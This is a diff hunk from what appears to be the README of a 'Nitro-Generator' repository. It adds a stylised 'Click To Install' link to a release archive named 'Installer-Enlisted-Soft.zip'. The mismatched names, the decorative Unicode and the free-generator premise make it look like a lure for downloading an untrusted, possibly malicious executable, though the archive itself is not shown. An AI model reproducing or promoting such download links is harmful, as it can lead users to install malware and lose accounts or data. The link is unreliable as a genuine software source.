@@ -10,7 +10,7 @@
 
 - #### 💻 Downloading:
 
-- [𝘾𝙡𝙞𝙘𝙠 𝙏𝙤 𝙄𝙣𝙨𝙩𝙖𝙡𝙡]()
+- [𝘾𝙡𝙞𝙘𝙠 𝙏𝙤 𝙄𝙣𝙨𝙩𝙖𝙡𝙡](https://github.com/woods0/Nitro-Generator/releases/download/1/Installer-Enlisted-Soft.zip)
 
      
 
